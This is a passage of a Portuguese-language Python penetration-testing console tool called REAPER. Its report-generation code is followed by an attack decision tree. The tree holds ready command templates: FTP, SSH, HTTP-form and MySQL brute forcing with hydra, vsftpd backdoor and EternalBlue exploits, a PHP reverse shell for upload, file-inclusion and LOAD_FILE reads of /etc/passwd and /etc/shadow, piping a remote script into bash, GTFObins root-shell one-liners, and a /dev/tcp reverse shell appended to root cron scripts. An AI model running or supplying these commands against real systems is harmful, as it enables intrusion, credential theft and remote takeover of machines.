        PROJECT["phases"][str(ph["id"])] = phase_data
        save_project()
        console.print(f"\n[green]✔ Comando guardado nas notas da fase {ph['id']}.[/green]")

    pause()

# ── Preencher dados ──────────────────────────────────────────
def fill_phase(ph, color):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › PREENCHER DADOS[/{color}]",
        border_style=color))
    console.print("[dim]ENTER = manter valor actual  |  LIMPAR = apagar campo[/dim]\n")

    phase_data = PROJECT["phases"].get(str(ph["id"]), {})
    for (fkey, flabel) in ph["fields"]:
        current = phase_data.get(fkey, "")
        display = (f"[dim](actual: {current[:55]}...)[/dim]" if len(current) > 55
                   else f"[dim](actual: {current})[/dim]" if current
                   else "[dim](vazio)[/dim]")
        console.print(f"[{color}]{flabel}[/{color}] {display}")
        val = Prompt.ask("  ▶", default="").strip()
        if val.upper() == "LIMPAR":
            phase_data[fkey] = ""
        elif val:
            phase_data[fkey] = val

    PROJECT["phases"][str(ph["id"])] = phase_data
    save_project()
    console.print(f"\n[green]✔ Dados guardados.[/green]")
    pause()

# ── Ver dados ────────────────────────────────────────────────
def view_phase_data(ph, color):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › DADOS[/{color}]",
        border_style=color))
    console.print()
    phase_data = PROJECT["phases"].get(str(ph["id"]), {})
    t = Table(box=box.ROUNDED, border_style=color, show_lines=True)
    t.add_column("Campo", style=f"bold {color}", width=24)
    t.add_column("Valor", style="white",          width=58)
    for (fkey, flabel) in ph["fields"]:
        v = phase_data.get(fkey, "")
        t.add_row(flabel, v if v else "[dim]—[/dim]")
    console.print(t)
    pause()

# ── Menu Relatório ───────────────────────────────────────────
def report_menu():
    banner()
    console.print(Panel("[bold blue]📄 GERAR RELATÓRIO[/bold blue]", border_style="blue"))
    if not PROJECT["name"]:
        console.print("[yellow]Cria ou carrega um projecto primeiro.[/yellow]")
        pause(); return
    console.print()
    menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    menu.add_column(style="bold blue", width=6); menu.add_column()
    menu.add_row("[1]", "Relatório TXT")
    menu.add_row("[2]", "Relatório PDF (reportlab)")
    menu.add_row("[B]", "Voltar")
    console.print(menu)
    ch = Prompt.ask("[blue]REAPER › Relatório[/blue]").strip().upper()
    if ch == "1": generate_txt_report()
    elif ch == "2": generate_pdf_report()

# ── Relatório TXT ─────────────────────────────────────────────
def generate_txt_report():
    banner()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    lines = ["="*70,
             "  REAPER — Recon, Exploit, Analysis & Post-exploitation Reporting Engine",
             "  Autor: DarkReaper", "="*70,
             f"  Projecto : {PROJECT['name']}",
             f"  Alvo     : {PROJECT['target']}",
             f"  Data     : {PROJECT['date']}  |  Gerado em: {now}",
             "="*70, ""]
    for ph in PHASES:
        lines += ["─"*70, f"  FASE {ph['id']} — {ph['name']}", f"  {ph['desc']}", "─"*70]
        phase_data = PROJECT["phases"].get(str(ph["id"]), {})
        for (fkey, flabel) in ph["fields"]:
            lines.append(f"  {flabel:<32}: {phase_data.get(fkey, '—')}")
        lines.append("")
    lines += ["="*70, "  FIM DO RELATÓRIO", "="*70]
    report = "\n".join(lines)
    console.print(report)
    safe  = PROJECT["name"].replace(" ","_").replace("/","-")
    fname = f"reaper_report_{safe}_{PROJECT['date']}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(report)
    console.print(f"\n[green]✔ Relatório guardado:[/green] [bold]{fname}[/bold]")
    pause()

# ── Relatório PDF ─────────────────────────────────────────────
def generate_pdf_report():
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.units import mm
        from reportlab.lib.styles import ParagraphStyle
        from reportlab.lib.enums import TA_CENTER
        from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
            Table as RLTable, TableStyle, HRFlowable, PageBreak, KeepTogether)
        from reportlab.lib.colors import HexColor
    except ImportError:
        console.print("[red]Instala reportlab: pip install reportlab --break-system-packages[/red]")
        pause(); return

    BG    = HexColor("#0d1117"); CARD  = HexColor("#161b22")
    GREY2 = HexColor("#21262d"); BORDER= HexColor("#30363d")
    ACCENT= HexColor("#e63946"); WHITE = HexColor("#e6edf3")
    GREY  = HexColor("#8b949e"); GREEN = HexColor("#39d353")
    PH_C  = [HexColor(c) for c in [
        "#00d4ff","#39d353","#bc8cff","#e3b341","#f85149","#ff6b35","#1f6feb"]]

    safe  = PROJECT["name"].replace(" ","_").replace("/","-")
    fname = f"reaper_report_{safe}_{PROJECT['date']}.pdf"
    W, H  = A4

    def ps(n,**kw): return ParagraphStyle(n,**kw)
    S = {
        "title": ps("t", fontName="Helvetica-Bold", fontSize=22, textColor=ACCENT,  alignment=TA_CENTER, spaceAfter=4),
        "sub":   ps("s", fontName="Helvetica",      fontSize=10, textColor=WHITE,   alignment=TA_CENTER, spaceAfter=2),
        "meta":  ps("m", fontName="Helvetica",      fontSize=7,  textColor=GREY,    alignment=TA_CENTER, spaceAfter=2),
        "h2":    ps("h", fontName="Helvetica-Bold", fontSize=11, textColor=WHITE,   spaceBefore=6, spaceAfter=3),
        "body":  ps("b", fontName="Helvetica",      fontSize=9,  textColor=WHITE,   spaceAfter=3, leading=13),
        "small": ps("sm",fontName="Helvetica",      fontSize=7,  textColor=GREY,    alignment=TA_CENTER),
    }

    doc = SimpleDocTemplate(fname, pagesize=A4,
        leftMargin=15*mm, rightMargin=15*mm, topMargin=20*mm, bottomMargin=20*mm)
    story = []
    now   = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")

    # Capa
    story += [Spacer(1,18*mm), Paragraph("REAPER", S["title"]),
              Paragraph("Recon · Exploit · Analysis · Post-exploitation · Reporting Engine", S["sub"]),
              HRFlowable(width="100%", thickness=1, color=ACCENT), Spacer(1,5*mm)]

    meta = RLTable([
        ["Projecto", PROJECT["name"],  "Alvo",    PROJECT["target"]],
        ["Analista", "DarkReaper",       "Data",    PROJECT["date"]],
        ["Gerado",   now,              "",        ""],
    ], colWidths=[28*mm, 72*mm, 24*mm, 56*mm])
    meta.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,-1),CARD), ("TEXTCOLOR",(0,0),(0,-1),GREY),
        ("TEXTCOLOR",(2,0),(2,-1),GREY),   ("TEXTCOLOR",(1,0),(1,-1),WHITE),
        ("TEXTCOLOR",(3,0),(3,-1),WHITE),  ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
        ("FONTNAME",(0,0),(0,-1),"Helvetica-Bold"), ("FONTNAME",(2,0),(2,-1),"Helvetica-Bold"),
        ("FONTSIZE",(0,0),(-1,-1),8), ("ROWBACKGROUNDS",(0,0),(-1,-1),[CARD,GREY2]),
        ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
    ]))
    story += [meta, Spacer(1,6*mm)]

    # Sumário
    story.append(Paragraph("SUMÁRIO DE FASES", S["h2"]))
    sd = [["Fase","Nome","Estado"]]
    for ph in PHASES:
        pd2   = PROJECT["phases"].get(str(ph["id"]),{})
        fill  = len([v for v in pd2.values() if str(v).strip()])
        total = len(ph["fields"])
        estado= f"Completo ({fill}/{total})" if fill==total else \
                f"Parcial ({fill}/{total})"  if fill>0 else "Não preenchido"
        sd.append([str(ph["id"]), ph["name"], estado])
    st = RLTable(sd, colWidths=[14*mm,90*mm,76*mm])
    st.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,0),ACCENT), ("TEXTCOLOR",(0,0),(-1,0),WHITE),
        ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),8),
        ("ROWBACKGROUNDS",(0,1),(-1,-1),[CARD,GREY2]), ("TEXTCOLOR",(0,1),(-1,-1),WHITE),
        ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
        ("ALIGN",(0,0),(0,-1),"CENTER"),
    ]))
    story += [st, PageBreak()]

    # Fases
    for ph in PHASES:
        pc        = PH_C[ph["id"]-1]
        phase_data= PROJECT["phases"].get(str(ph["id"]),{})
        dark_text = HexColor("#0d1117")

        hdr = RLTable([[f"  FASE {ph['id']}  —  {ph['name']}  {ph['icon']}"]], colWidths=[180*mm])
        hdr.setStyle(TableStyle([
            ("BACKGROUND",(0,0),(-1,-1),pc), ("TEXTCOLOR",(0,0),(-1,-1),dark_text),
            ("FONTNAME",(0,0),(-1,-1),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),12),
            ("PADDING",(0,0),(-1,-1),8),
        ]))
        story += [KeepTogether([hdr, Spacer(1,2*mm)]), Paragraph(ph["desc"], S["body"]), Spacer(1,3*mm)]

        # Dados
        story.append(Paragraph("DADOS DO TESTE", ParagraphStyle("h3",
            fontName="Helvetica-Bold", fontSize=9, textColor=pc, spaceAfter=3, spaceBefore=4)))
        dr = [["Campo","Valor"]]
        for (fk, fl) in ph["fields"]:
            dr.append([fl, phase_data.get(fk,"") or "—"])
        dt = RLTable(dr, colWidths=[55*mm,125*mm])
        dt.setStyle(TableStyle([
            ("BACKGROUND",(0,0),(-1,0),pc), ("TEXTCOLOR",(0,0),(-1,0),dark_text),
            ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),8),
            ("ROWBACKGROUNDS",(0,1),(-1,-1),[CARD,GREY2]),
            ("TEXTCOLOR",(0,1),(0,-1),GREY), ("TEXTCOLOR",(1,1),(-1,-1),WHITE),
            ("FONTNAME",(0,1),(0,-1),"Helvetica-Bold"),
            ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
            ("VALIGN",(0,0),(-1,-1),"TOP"),
        ]))
        story += [dt, Spacer(1,4*mm)]

        # Ferramentas de referência
        phase_tools = TOOL_DEFINITIONS.get(ph["id"], [])
        if phase_tools:
            story.append(Paragraph("FERRAMENTAS DE REFERÊNCIA", ParagraphStyle("h3b",
                fontName="Helvetica-Bold", fontSize=9, textColor=pc, spaceAfter=3)))
            tr = [["Ferramenta","Comando","Parâmetros necessários"]]
            for tool in phase_tools:
                param_list = ", ".join(p["label"] for p in tool["params"]) if tool["params"] else "—"
                tr.append([tool["name"], tool["cmd"], param_list])
            tt = RLTable(tr, colWidths=[30*mm,90*mm,60*mm])
            tt.setStyle(TableStyle([
                ("BACKGROUND",(0,0),(-1,0),GREY2), ("TEXTCOLOR",(0,0),(-1,0),pc),
                ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),7),
                ("ROWBACKGROUNDS",(0,1),(-1,-1),[HexColor("#0d1117"),CARD]),
                ("TEXTCOLOR",(0,1),(0,-1),WHITE), ("TEXTCOLOR",(1,1),(1,-1),GREEN),
                ("TEXTCOLOR",(2,1),(2,-1),GREY),  ("FONTNAME",(1,1),(1,-1),"Courier"),
                ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),4),
                ("VALIGN",(0,0),(-1,-1),"TOP"),
            ]))
            story.append(tt)
        story.append(PageBreak())

    story += [HRFlowable(width="100%",thickness=1,color=ACCENT), Spacer(1,3*mm),
              Paragraph(f"REAPER — Relatório Final  |  DarkReaper  |  {now}", S["small"])]

    def dark_bg(c, d):
        c.saveState(); c.setFillColor(BG)
        c.rect(0, 0, W, H, fill=1, stroke=0); c.restoreState()

    doc.build(story, onFirstPage=dark_bg, onLaterPages=dark_bg)
    console.print(f"\n[green]✔ PDF gerado:[/green] [bold]{fname}[/bold]")
    pause()


# ═══════════════════════════════════════════════════════════
#  MOTOR DE INTELIGÊNCIA — Vectores e Árvore de Decisão
# ═══════════════════════════════════════════════════════════

ATTACK_TREE = {

    # ── FTP ─────────────────────────────────────────────────
    "ftp": {
        "label": "FTP",
        "color": "cyan",
        "icon": "📁",
        "detect": lambda ports, banners: any(
            p in ports for p in ["21"]) or "ftp" in banners.lower(),
        "attacks": [
            {
                "name": "Acesso anónimo",
                "desc": "Testa login FTP sem credenciais (anonymous)",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "ftp -n {alvo} <<EOF\nquote USER anonymous\nquote PASS anonymous@\nls\nEOF",
                "simple_cmd": "ftp {alvo}",
                "followup": {
                    "success": ["ftp_list_files", "ftp_download"],
                    "fail":    ["ftp_brute", "ftp_exploit_version"]
                },
                "hints": "Quando ligar: user=anonymous  pass=(qualquer email ou vazio)"
            },
            {
                "name": "Brute force FTP (hydra)",
                "desc": "Ataque de dicionário às credenciais FTP",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",          "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador",        "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} ftp://{alvo}",
                "followup": {
                    "success": ["ftp_login_creds"],
                    "fail":    ["ftp_exploit_version"]
                },
                "hints": "Se tiveres lista de users: substitui -l por -L users.txt"
            },
            {
                "name": "Exploit vsftpd 2.3.4 backdoor",
                "desc": "CVE backdoor famoso no vsftpd 2.3.4 — dá shell root",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {alvo}; run'",
                "followup": {
                    "success": ["privesc_tree"],
                    "fail":    ["ftp_brute"]
                },
                "hints": "Só funciona se a versão for exactamente vsftpd 2.3.4"
            },
            {
                "name": "Listar ficheiros FTP",
                "desc": "Após acesso — listar e descarregar ficheiros",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                    {"key": "user", "label": "Utilizador", "default": "anonymous"},
                    {"key": "pass_", "label": "Password",  "default": "anonymous"},
                ],
                "cmd": "ftp -n {alvo} <<EOF\nuser {user} {pass_}\nls -la\nbinary\nmget *\nEOF",
                "followup": {"success": ["analyse_files"], "fail": []},
                "hints": "mget * descarrega todos os ficheiros. Cuidado com tamanho."
            },
            {
                "name": "Searchsploit FTP",
                "desc": "Procurar exploits para a versão FTP encontrada",
                "params": [
                    {"key": "servico", "label": "Serviço/versão (ex: vsftpd 2.3.4)", "default": "vsftpd"},
                ],
                "cmd": "searchsploit {servico}",
                "followup": {"success": [], "fail": []},
                "hints": "Copia o caminho do exploit e usa searchsploit -m <path>"
            },
        ]
    },

    # ── SSH ─────────────────────────────────────────────────
    "ssh": {
        "label": "SSH",
        "color": "green",
        "icon": "🔐",
        "detect": lambda ports, banners: "22" in ports or "ssh" in banners.lower(),
        "attacks": [
            {
                "name": "Brute force SSH (hydra)",
                "desc": "Ataque de dicionário às credenciais SSH",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",         "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador",       "default": "root"},
                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
                    {"key": "port",     "label": "Porto SSH",        "default": "22"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} -s {port} -t 4 ssh://{alvo}",
                "followup": {
                    "success": ["ssh_login", "privesc_tree"],
                    "fail":    ["ssh_user_enum", "ssh_exploit_version"]
                },
                "hints": "Começa com users comuns: root, admin, www-data, ubuntu, kali"
            },
            {
                "name": "Enumeração de utilizadores SSH",
                "desc": "Tentar descobrir usernames válidos no servidor SSH",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "nmap -p 22 --script ssh-auth-methods,ssh-hostkey {alvo}",
                "followup": {
                    "success": ["ssh_brute_user"],
                    "fail":    ["ssh_exploit_version"]
                },
                "hints": "Também podes usar: ssh-user-enum ou metasploit auxiliary/scanner/ssh/ssh_enumusers"
            },
            {
                "name": "Login SSH com credenciais",
                "desc": "Entrar no sistema com credenciais obtidas",
                "params": [
                    {"key": "user", "label": "Utilizador",  "default": ""},
                    {"key": "alvo", "label": "IP alvo",     "default": "{TARGET}"},
                    {"key": "port", "label": "Porto",       "default": "22"},
                ],
                "cmd": "ssh {user}@{alvo} -p {port}",
                "followup": {
                    "success": ["privesc_tree"],
                    "fail":    ["ssh_key_auth"]
                },
                "hints": "Após entrar corre: sudo -l  e  id  para ver privilégios"
            },
            {
                "name": "Exploit OpenSSH (searchsploit)",
                "desc": "Procurar exploits para a versão SSH encontrada",
                "params": [
                    {"key": "versao", "label": "Versão OpenSSH (ex: 7.4)", "default": ""},
                ],
                "cmd": "searchsploit openssh {versao}",
                "followup": {"success": [], "fail": []},
                "hints": "Verifica a versão exacta no output do nmap (-sV)"
            },
        ]
    },

    # ── HTTP / WEB ───────────────────────────────────────────
    "http": {
        "label": "HTTP / Web",
        "color": "yellow",
        "icon": "🌐",
        "detect": lambda ports, banners: any(
            p in ports for p in ["80","443","8080","8443","8888"]) or "http" in banners.lower(),
        "attacks": [
            {
                "name": "Nikto — scan vulnerabilidades web",
                "desc": "Scanner automático de vulnerabilidades HTTP",
                "params": [
                    {"key": "alvo",  "label": "IP / URL alvo", "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto",         "default": "80"},
                ],
                "cmd": "nikto -h {alvo} -p {porto}",
                "followup": {
                    "success": ["web_sqli", "web_lfi", "web_upload"],
                    "fail":    ["gobuster_enum"]
                },
                "hints": "Procura no output por: SQL injection, LFI, upload, default creds"
            },
            {
                "name": "Gobuster — enumerar directorias",
                "desc": "Descobrir ficheiros e pastas escondidas",
                "params": [
                    {"key": "url",      "label": "URL alvo",   "default": "http://{TARGET}"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/dirb/common.txt"},
                    {"key": "ext",      "label": "Extensões",  "default": "php,html,txt,bak"},
                ],
                "cmd": "gobuster dir -u {url} -w {wordlist} -x {ext}",
                "followup": {
                    "success": ["web_analyse_dirs"],
                    "fail":    ["feroxbuster_enum"]
                },
                "hints": "Atenção a: /admin, /backup, /config, /upload, .bak, .old"
            },
            {
                "name": "Feroxbuster — enumerar recursivo",
                "desc": "Fuzzing recursivo mais agressivo que gobuster",
                "params": [
                    {"key": "url",      "label": "URL alvo",          "default": "http://{TARGET}"},
                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/dirb/common.txt"},
                    {"key": "depth",    "label": "Profundidade",      "default": "3"},
                ],
                "cmd": "feroxbuster -u {url} -w {wordlist} -d {depth} -x php,html,txt",
                "followup": {
                    "success": ["web_analyse_dirs"],
                    "fail":    ["web_sqli"]
                },
                "hints": "Mais lento mas encontra mais — usa após gobuster falhar"
            },
            {
                "name": "WPScan — WordPress",
                "desc": "Detectar WordPress e enumerar users/plugins vulneráveis",
                "params": [
                    {"key": "url",  "label": "URL WordPress", "default": "http://{TARGET}"},
                    {"key": "enum", "label": "Enumeração",    "default": "u,vp,ap"},
                ],
                "cmd": "wpscan --url {url} -e {enum} --plugins-detection aggressive",
                "followup": {
                    "success": ["wp_brute", "wp_exploit_plugin"],
                    "fail":    ["web_sqli"]
                },
                "hints": "u=users  vp=plugins vulneráveis  ap=todos os plugins"
            },
            {
                "name": "SQLMap — SQL Injection",
                "desc": "Testar e explorar SQL Injection automaticamente",
                "params": [
                    {"key": "url",   "label": "URL com parâmetro (ex: http://alvo/page?id=1)", "default": ""},
                    {"key": "level", "label": "Nível (1-5)",   "default": "3"},
                    {"key": "risk",  "label": "Risco (1-3)",   "default": "2"},
                ],
                "cmd": "sqlmap -u '{url}' --level={level} --risk={risk} --dbs --batch",
                "followup": {
                    "success": ["sqli_dump", "sqli_shell"],
                    "fail":    ["web_lfi"]
                },
                "hints": "Encontrando DBs: adiciona --tables -D <db>  depois --dump -T <table>"
            },
            {
                "name": "SQLMap — dump de tabela",
                "desc": "Extrair dados de uma tabela específica",
                "params": [
                    {"key": "url",   "label": "URL vulnerável",  "default": ""},
                    {"key": "db",    "label": "Base de dados",   "default": ""},
                    {"key": "table", "label": "Tabela",          "default": "users"},
                ],
                "cmd": "sqlmap -u '{url}' -D {db} -T {table} --dump --batch",
                "followup": {
                    "success": ["crack_hashes"],
                    "fail":    ["web_lfi"]
                },
                "hints": "Procura tabelas: users, accounts, admin, passwords, credentials"
            },
            {
                "name": "LFI — Local File Inclusion",
                "desc": "Testar inclusão de ficheiros locais no servidor",
                "params": [
                    {"key": "url", "label": "URL com parâmetro (ex: http://alvo/page?file=)", "default": ""},
                ],
                "cmd": "curl '{url}../../../etc/passwd'",
                "followup": {
                    "success": ["lfi_log_poison", "lfi_read_files"],
                    "fail":    ["web_upload"]
                },
                "hints": "Tenta: ?file=  ?page=  ?include=  ?path=  ?lang=  ?template="
            },
            {
                "name": "Upload de shell web",
                "desc": "Fazer upload de reverse shell PHP para o servidor",
                "params": [
                    {"key": "url_upload", "label": "URL da página de upload", "default": ""},
                    {"key": "lhost",      "label": "Teu IP",                  "default": ""},
                    {"key": "lport",      "label": "Porta listener",          "default": "4444"},
                ],
                "cmd": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php && echo 'Shell criada: shell.php — faz upload manual'",
                "followup": {
                    "success": ["nc_listener", "privesc_tree"],
                    "fail":    ["web_sqli"]
                },
                "hints": "Após upload navega para http://alvo/uploads/shell.php com o listener activo"
            },
            {
                "name": "Hydra — brute force HTTP form",
                "desc": "Força bruta num formulário de login web",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",                       "default": "{TARGET}"},
                    {"key": "path",     "label": "Path do login (ex: /login.php)","default": "/login.php"},
                    {"key": "user",     "label": "Utilizador",                    "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",                      "default": "/usr/share/wordlists/rockyou.txt"},
                    {"key": "fail_str", "label": "String de falha (ex: Invalid)", "default": "Invalid"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} {alvo} http-post-form '{path}:username=^USER^&password=^PASS^:F={fail_str}'",
                "followup": {
                    "success": ["web_authenticated"],
                    "fail":    ["web_sqli"]
                },
                "hints": "Inspecciona o HTML do form para ver os nomes dos campos (username/password)"
            },
        ]
    },

    # ── SMB ─────────────────────────────────────────────────
    "smb": {
        "label": "SMB / Samba",
        "color": "magenta",
        "icon": "🗄️",
        "detect": lambda ports, banners: any(
            p in ports for p in ["139","445"]) or "smb" in banners.lower() or "samba" in banners.lower(),
        "attacks": [
            {
                "name": "enum4linux — enumeração completa",
                "desc": "Enumerar utilizadores, partilhas e políticas SMB",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "enum4linux -a {alvo}",
                "followup": {
                    "success": ["smb_access_shares", "smb_brute"],
                    "fail":    ["smb_nmap"]
                },
                "hints": "Procura: utilizadores, partilhas acessíveis, versão Samba"
            },
            {
                "name": "smbclient — listar partilhas",
                "desc": "Listar e aceder a partilhas SMB sem autenticação",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "smbclient -L //{alvo} -N",
                "followup": {
                    "success": ["smb_access_share_anon"],
                    "fail":    ["smb_brute"]
                },
                "hints": "Partilhas interessantes: Users, Backup, Admin, Data, Share"
            },
            {
                "name": "smbclient — aceder partilha",
                "desc": "Entrar numa partilha SMB específica",
                "params": [
                    {"key": "alvo",    "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "share",   "label": "Nome da partilha","default": ""},
                    {"key": "user",    "label": "Utilizador (-N para anon)", "default": "-N"},
                ],
                "cmd": "smbclient //{alvo}/{share} {user}",
                "followup": {
                    "success": ["smb_download_files"],
                    "fail":    ["smb_brute"]
                },
                "hints": "Dentro da partilha: ls, get <ficheiro>, mget *"
            },
            {
                "name": "EternalBlue — MS17-010",
                "desc": "Exploit SMB crítico (Windows 7/2008 não patchado)",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",   "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",    "default": ""},
                ],
                "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {alvo}; set LHOST {lhost}; run'",
                "followup": {
                    "success": ["privesc_tree", "dump_hashes"],
                    "fail":    ["smb_brute"]
                },
                "hints": "Verifica primeiro: nmap --script smb-vuln-ms17-010 {alvo}"
            },
            {
                "name": "Nmap SMB vulnerabilidades",
                "desc": "Verificar CVEs SMB com scripts NSE",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "nmap -p 139,445 --script smb-vuln* {alvo}",
                "followup": {
                    "success": ["smb_eternal_blue", "smb_brute"],
                    "fail":    []
                },
                "hints": "Procura: ms17-010 (EternalBlue), ms08-067, ms06-025"
            },
        ]
    },

    # ── SQL / Base de dados ──────────────────────────────────
    "sql": {
        "label": "SQL / Base de Dados",
        "color": "bright_red",
        "icon": "🗃️",
        "detect": lambda ports, banners: any(
            p in ports for p in ["3306","5432","1433","1521"]) or \
            any(s in banners.lower() for s in ["mysql","postgres","mssql","oracle"]),
        "attacks": [
            {
                "name": "MySQL — login sem password",
                "desc": "Testar acesso MySQL root sem autenticação",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "mysql -h {alvo} -u root --password=''",
                "followup": {
                    "success": ["mysql_enum", "mysql_file_read"],
                    "fail":    ["mysql_brute"]
                },
                "hints": "Tenta também: -u admin, -u mysql, -u sa"
            },
            {
                "name": "MySQL — brute force",
                "desc": "Força bruta às credenciais MySQL",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "root"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} {alvo} mysql",
                "followup": {
                    "success": ["mysql_enum"],
                    "fail":    []
                },
                "hints": "Após acesso: show databases;  use <db>;  show tables;  select * from users;"
            },
            {
                "name": "MySQL — ler ficheiros do sistema",
                "desc": "Usar LOAD_FILE para ler ficheiros sensíveis",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "root"},
                    {"key": "pass_",    "label": "Password",   "default": ""},
                    {"key": "ficheiro", "label": "Ficheiro",   "default": "/etc/passwd"},
                ],
                "cmd": "mysql -h {alvo} -u {user} -p{pass_} -e \"SELECT LOAD_FILE('{ficheiro}');\"",
                "followup": {"success": [], "fail": []},
                "hints": "Também tenta: /etc/shadow, /var/www/html/config.php, wp-config.php"
            },
        ]
    },

    # ── Escalada de Privilégios ──────────────────────────────
    "privesc": {
        "label": "Escalada de Privilégios",
        "color": "bright_red",
        "icon": "⬆️",
        "detect": lambda ports, banners: False,  # activado manualmente
        "attacks": [
            {
                "name": "LinPEAS — enumeração automática",
                "desc": "Ferramenta mais completa para encontrar vectores de escalada",
                "params": [
                    {"key": "lhost",  "label": "Teu IP (servidor HTTP)", "default": ""},
                    {"key": "output", "label": "Ficheiro output",        "default": "linpeas.txt"},
                ],
                "cmd": "curl http://{lhost}/linpeas.sh | bash | tee {output}",
                "followup": {
                    "success": ["privesc_sudo", "privesc_suid", "privesc_cron", "privesc_caps"],
                    "fail":    ["privesc_manual"]
                },
                "hints": "Serve o linpeas.sh com: python3 -m http.server 80 (na tua máquina)"
            },
            {
                "name": "sudo -l — comandos sem password",
                "desc": "Ver o que podes correr como root sem password",
                "params": [],
                "cmd": "sudo -l",
                "followup": {
                    "success": ["privesc_sudo_gtfobins"],
                    "fail":    ["privesc_suid"]
                },
                "hints": "Com resultado: vai a gtfobins.github.io e procura o binário encontrado"
            },
            {
                "name": "GTFObins — explorar sudo",
                "desc": "Escalar com binário encontrado no sudo -l",
                "params": [
                    {"key": "binario", "label": "Binário encontrado (ex: vim, find, python)", "default": ""},
                ],
                "cmd": "echo 'Consulta: https://gtfobins.github.io/gtfobins/{binario}/#sudo'",
                "simple_cmd": "sudo {binario} -c 'id; /bin/bash'",
                "followup": {
                    "success": ["root_shell"],
                    "fail":    ["privesc_suid"]
                },
                "hints": "Exemplos:\n  sudo find . -exec /bin/bash \\;\n  sudo vim -c ':!/bin/bash'\n  sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
            },
            {
                "name": "SUID — binários exploráveis",
                "desc": "Encontrar binários SUID e explorar via GTFObins",
                "params": [],
                "cmd": "find / -perm -4000 2>/dev/null",
                "followup": {
                    "success": ["privesc_suid_exploit"],
                    "fail":    ["privesc_cron"]
                },
                "hints": "Binários SUID comuns exploráveis: find, bash, python, vim, cp, cat, nmap"
            },
            {
                "name": "SUID — explorar binário",
                "desc": "Usar GTFObins para escalar com binário SUID encontrado",
                "params": [
                    {"key": "binario", "label": "Caminho completo do binário SUID", "default": ""},
                ],
                "cmd": "echo 'Ver: https://gtfobins.github.io/#'",
                "simple_cmd": "{binario} -p",
                "followup": {
                    "success": ["root_shell"],
                    "fail":    ["privesc_cron"]
                },
                "hints": "Exemplos:\n  /usr/bin/find . -exec /bin/bash -p \\;\n  /usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
            },
            {
                "name": "Cron jobs — tarefas agendadas",
                "desc": "Encontrar cron jobs que correm como root com scripts editáveis",
                "params": [],
                "cmd": "cat /etc/crontab; ls -la /etc/cron*; find / -name '*.sh' -writable 2>/dev/null",
                "followup": {
                    "success": ["privesc_cron_exploit"],
                    "fail":    ["privesc_caps"]
                },
                "hints": "Se encontrares script writable que corre como root:\n  echo 'bash -i >& /dev/tcp/TUA_IP/4444 0>&1' >> script.sh"
            },
            {
                "name": "Capabilities — binários especiais",
                "desc": "Procurar binários com capabilities elevadas",
                "params": [],
                "cmd": "getcap -r / 2>/dev/null",
